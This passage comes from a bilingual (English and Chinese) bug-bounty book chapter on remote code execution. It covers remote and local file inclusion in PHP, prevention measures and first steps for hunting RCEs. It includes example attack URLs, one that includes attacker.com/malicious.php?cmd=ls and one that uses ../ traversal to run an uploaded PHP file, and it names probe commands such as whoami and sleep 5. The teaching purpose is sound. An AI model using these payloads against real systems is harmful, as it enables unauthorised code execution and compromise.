Another way attackers can achieve RCE is by making the target server
include a file containing malicious code. This *file inclusion
vulnerability* has two subtypes: remote file inclusion and local file
inclusion.
攻击者可以通过使目标服务器包含恶意代码的文件来实现RCE的另一种方式。这种文件包含漏洞有两种子类型：远程文件包含和本地文件包含。
*Remote file inclusion* vulnerabilities occur when the application
allows arbitrary files from a remote server to be included. This happens
when applications dynamically include external files and scripts on
their pages and use user input to determine the location of the included
file.
远程文件包含漏洞发生在应用程序允许从远程服务器包含任意文件的情况下。当应用程序在其页面上动态包含外部文件和脚本并使用用户输入确定所包含文件的位置时，就会发生这种情况。
To see how this works, let's look at a vulnerable application. The
following PHP program calls the PHP `      include     ` function on the
value of the user-submitted HTTP GET parameter `      page     ` . The
`      include     ` function then includes and evaluates the specified
file:
为了了解这个如何工作，让我们来看一个易受攻击的应用程序。以下的PHP程序通过值为用户提交的HTTP
GET参数"page"的PHP
include函数来调用。然后，include函数将包括并评估指定的文件：
This code allows users to access the various pages of the website by
changing the `      page     ` parameter. For example, to view the
site's Index and About pages, the user can visit
*http://example.com/?page=index.php* and
*http://example.com/?page=about.php* , respectively.
该代码允许用户通过更改页面参数来访问网站的各个页面。例如，要查看网站的主页和关于页面，用户可以分别访问http://example.com/?page=index.php和http://example.com/?page=about.php。
But if the application doesn't limit which file the user includes with
the `      page     ` parameter, an attacker can include a malicious PHP
file hosted on their server and get that executed by the target server.
如果应用程序不限制用户使用页面参数包含的文件，攻击者可以在其服务器上包含恶意PHP文件并通过目标服务器执行它。
In this case, let's host a PHP page named *malicious.php* that will
execute the string contained in the URL GET parameter `      cmd     `
as a system command. The `      system()     ` command in PHP is similar
to `      os.system()     ` in Python. They both execute a system
command and display the output. Here is the content of our malicious PHP
file:
在这种情况下，让我们托管一个名为malicious.php的PHP页面，该页面将执行URL
GET参数cmd中包含的字符串作为系统命令。
PHP中的system（）命令类似于Python中的os.system（）。它们都执行系统命令并显示输出。以下是我们恶意PHP文件的内容：
If the attacker loads this page on *example.com* , the site will
evaluate the code contained in *malicious.php* located on the attacker's
server. The malicious script will then make the target server execute
the system command `      ls     ` :
如果攻击者在example.com上加载此页面，则该站点将评估包含在攻击者服务器上的恶意.php中的代码。
恶意脚本然后将使目标服务器执行系统命令ls。
    http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
[ ]{#c18.xhtml#Page_287 .pagebreak title="287"} Notice that this same
feature is vulnerable to SSRF and XSS too. This endpoint is vulnerable
to SSRF because the page could load info about the local system and
network. Attackers could also make the page load a malicious JavaScript
file and trick the user into clicking it to execute a reflected XSS
attack.
请注意，相同的功能也容易受到SSRF和XSS的攻击。此端点易受SSRF攻击，因为页面可以加载有关本地系统和网络信息的页面。攻击者还可以让页面加载恶意JavaScript文件，并诱使用户单击它以执行反射性XSS攻击。
On the other hand, *local file inclusions* happen when applications
include files in an unsafe way, but the inclusion of remote files isn't
allowed. In this case, attackers need to first upload a malicious file
to the local machine, and then execute it by using local file inclusion.
Let's modify our previous example a bit. The following PHP file first
gets the HTTP GET parameter `      page     ` and then calls the PHP
`      include     ` function after concatenating `      page     ` with
a directory name containing the files users can load:
另一方面，本地文件包含是指应用程序以不安全的方式包含文件，但不允许包含远程文件。
在这种情况下，攻击者需要首先将恶意文件上传到本地计算机，然后使用本地文件包含来执行它。
让我们稍微修改一下之前的示例。 以下PHP文件首先获取HTTP
GET参数page，然后在将page与包含用户可加载的文件的目录名称连接后调用PHP
include函数：
The site's *lang* directory contains its home page in multiple
languages. For example, users can visit
*http://example.com/?page=de-index.php* and
*http://example.com/?page=en-index.php* to visit the German and English
home pages, respectively. These URLs will cause the website to load the
page */var/www/html/lang/de-index.php* and
*/var/www/html/lang/en-index.php* to display the German and English home
pages.
该网站的 lang 目录包含多种语言的主页。例如，用户可以访问
http://example.com/?page=de-index.php 和
http://example.com/?page=en-index.php 分别访问德语和英语主页。这些 URL
将导致网站加载页面 /var/www/html/lang/de-index.php 和
/var/www/html/lang/en-index.php 来显示德语和英语主页。
In this case, if the application doesn't place any restrictions on the
possible values of the `      page     ` parameter, attackers can load a
page of their own by exploiting an upload feature. Let's say that
*example.com* allows users to upload files of all file types, then
stores them in the */var/www/html/uploads/USERNAME* directory. The
attacker could upload a malicious PHP file to the *uploads* folder. Then
they could use the sequence `      ../     ` to escape out of the *lang*
directory and execute the malicious uploaded file on the target server:
如果应用程序不对页面参数的可能值施加任何限制，攻击者可以通过利用上传功能来加载自己的页面。例如，example.com允许用户上传所有文件类型，然后将它们存储在/var/www/html/uploads/用户名目录中。攻击者可以将恶意的PHP文件上传到上传文件夹中。然后他们可以使用../序列从lang目录中逃脱并在目标服务器上执行恶意上传的文件。
    http://example.com/?page=../uploads/USERNAME/malicious.php
If the attacker loads this URL, the website will include the file
*/var/www/html/lang/../uploads/USERNAME/malicious.php* , which points to
*/var/www/html/uploads/USERNAME/malicious.php* .
如果攻击者加载此URL，则网站将包含文件/var/www/html/lang/../uploads/USERNAME/malicious.php，该文件指向/var/www/html/uploads/USERNAME/malicious.php。
## Prevention {#c18.xhtml#h1-501546c18-0002}
To prevent code injections, you should avoid inserting user input into
code that gets evaluated. Also, since user input can be passed into
evaluated code through files that are parsed by the application, you
should treat user-uploaded files as untrusted, as well as protect the
integrity of existing system files that your programs execute, parse, or
include.
为了防止注入攻击，应避免将用户输入插入到将被评估的代码中。此外，由于用户输入可以通过应用程序解析的文件传递到评估的代码中，因此应将用户上传的文件视为不可信，并保护程序执行、解析或包含的现有系统文件的完整性。
[ ]{#c18.xhtml#Page_288 .pagebreak title="288"} And to prevent file
inclusion vulnerabilities, you should avoid including files based on
user input. If that isn't possible, disallow the inclusion of remote
files and create an allowlist of local files that your programs can
include. You can also limit file uploads to certain safe file types and
host uploaded files in a separate environment than the application's
source code.
为了防止文件包含漏洞，应避免基于用户输入包含文件。如果不可能，禁止包含远程文件，并创建一个白名单，其中包含您的程序可以包含的本地文件。您还可以将文件上传限制为某些安全文件类型，并将上传的文件托管在应用程序源代码的不同环境中。
Also avoid calling system commands directly and use the programming
language's system APIs instead. Most programming languages have built-in
functions that allow you to run system commands without risking command
injection. For instance, PHP has a function named `      mkdir(     `
`      DIRECTORY_NAME     `{.variable} `      )     ` . You can use it
to create new directories instead of calling `      system("mkdir     `
`      DIRECTORY_NAME     `{.variable} `      ")     ` .
避免直接调用系统命令，而是使用编程语言的系统API。大多数编程语言都内置了函数，允许您运行系统命令而不会有命令注入的风险。例如，PHP有一个名为mkdir（DIRECTORY_NAME）的函数。您可以使用它来创建新目录，而不是调用system（\"mkdir DIRECTORY_NAME\"）。
You should implement strong input validation for input passed into
dangerous functions like `      eval()     ` or `      include()     ` .
But this technique cannot be relied on as the only form of protection,
because attackers are constantly coming up with inventive methods to
bypass input validation.
你应该在诸如eval()或include()等危险函数传入的输入上实施强输入验证。但是，这种技术不能作为唯一的保护形式，因为攻击者不断想出新的方法来绕过输入验证。
Finally, staying up-to-date with patches will prevent your application's
dependencies from introducing RCE vulnerabilities. An application's
dependencies, such as open source packages and components, often
introduce vulnerabilities into an application. This is also called a
*software supply chain attack* .
最后，保持补丁程序最新将防止您的应用程序依赖项引入RCE漏洞。
应用程序的依赖项，例如开源软件包和组件，通常会引入应用程序漏洞。
这也被称为软件供应链攻击。
You can also deploy a *web application firewall* *(* *WAF)* to block
suspicious attacks. Besides preventing RCEs, this could also help
prevent some of the vulnerabilities I've discussed earlier in this book,
such as SQL injection and XSS.
你也可以部署Web应用防火墙（WAF）来阻止可疑攻击。除了防止RCE，这还可以帮助防止我在本书中讨论过的一些漏洞，例如SQL注入和XSS。
If an attacker does achieve RCE on a machine, how could you minimize the
harm they can cause? The *principle of least privilege* states that
applications and processes should be granted only the privileges
required to complete their tasks. It is a best practice that lowers the
risk of system compromise during an attack because attackers won't be
able to gain access to sensitive files and operations even if they
compromise a low-privileged user or process. For example, when a web
application requires only read access to a file, it shouldn't be granted
any writing or execution permissions. That's because, if an attacker
hijacks an application that runs with high privilege, the attacker can
gain its permissions.
如果攻击者在一台计算机上实现了RCE，您可以如何减少他们可能造成的危害？最小权限原则表明，应仅授予应用程序和进程完成其任务所需的权限。这是一种最佳实践，可在攻击期间降低系统遭受妥协的风险，因为即使攻击者入侵了低权限用户或进程，他们也无法访问敏感文件和操作。例如，当Web应用程序仅需要读取文件时，不应授予任何写入或执行权限。这是因为，如果攻击者劫持以高权限运行的应用程序，则攻击者可以获得其权限。
## Hunting for RCEs {#c18.xhtml#h1-501546c18-0003}
Like many of the attacks we've covered thus far, RCEs have two types:
classic and blind. *Classic RCEs* are the ones in which you can read the
results of the code execution in a subsequent HTTP response, whereas
*blind RCEs* occur when the malicious code is executed but the returned
values of the execution do not appear in any HTTP response. Although
attackers cannot witness the results of their executions, blind RCEs are
just as dangerous as classic RCEs because they can enable attackers to
spawn reverse shells or exfiltrate data to a remote server. Hunting for
these two types of RCE is a similar process, but the commands or code
snippets you'll need to use to verify these vulnerabilities will differ.
正如我们之前所介绍的攻击一样，RCEs 也有两种类型: 经典和盲目的。经典 RCEs
是指在随后的 HTTP 响应中可以读取代码执行的结果，而盲目 RCEs
是指虽然执行了恶意代码，但是执行的返回值不会出现在任何 HTTP
响应结果中。尽管攻击者无法看到执行结果，但盲目 RCEs 与经典 RCEs
一样危险，因为它们可以使攻击者生成反向 shell
或向远程服务器外泄数据。寻找这两种类型的 RCEs
的过程是相似的，但用于验证这些漏洞的命令或代码段将有所不同。
[ ]{#c18.xhtml#Page_289 .pagebreak title="289"} Here are some commands
you can use when attacking Linux servers. When hunting for a classic RCE
vulnerability, all you need to do to verify the vulnerability is to
execute a command such as `      whoami     ` , which outputs the
username of the current user. If the response contains the web server's
username, such as `      www-data     ` , you've confirmed the RCE, as
the command has successfully run. On the other hand, to validate a blind
RCE, you'll need to execute a command that influences system behavior,
like `      sleep 5     ` , which delays the response by five seconds.
Then if you experience a five-second delay before receiving a response,
you can confirm the vulnerability. Similar to the blind techniques we
used to exploit other vulnerabilities, you can also set up a listener
and attempt to trigger out-of-band interaction from the target server.
这里是攻击Linux服务器时可用的一些命令。在寻找传统的RCE漏洞时，您只需要执行一个命令，如whoami，它会输出当前用户的用户名来验证漏洞。如果响应中包含Web服务器的用户名，例如www-data，则已确认RCE，因为命令已成功运行。另一方面，要验证盲目RCE，您需要执行影响系统行为的命令，如sleep
5，它会将响应延迟五秒钟。然后，如果您在接收到响应之前经历了五秒钟的延迟，您可以确认漏洞。与我们用来利用其他漏洞的盲目技术类似，您还可以设置侦听器并尝试触发来自目标服务器的带外交互。
### Step 1: Gather Information About the Target {#c18.xhtml#h2-501546c18-0003}
The first step to finding any vulnerability is to gather information
about the target. When hunting for RCEs, this step is especially
important because the route to achieving an RCE is extremely dependent
on the way the target is built. You should find out information about
the web server, programming language, and other technologies used by
your current target. Use the recon steps outlined in [ Chapter 5 ]{.xref
itemid="xref_target_Chapter 5"} to do this.
寻找漏洞的第一步是收集有关目标的信息。寻找RCE时，这一步尤其重要，因为实现RCE的路径极大程度上取决于目标的构建方式。您应该了解有关当前目标使用的Web服务器、编程语言和其他技术的信息。请使用第5章中概述的侦察步骤来完成。
### Step 2: Identify Suspicious User Input Locations {#c18.xhtml#h2-501546c18-0004}
As with finding many other vulnerabilities, the next step to finding any
RCE is to identify the locations where users can submit input to the
application. When hunting for code injections, take note of every direct
user-input location, including URL parameters, HTTP headers, body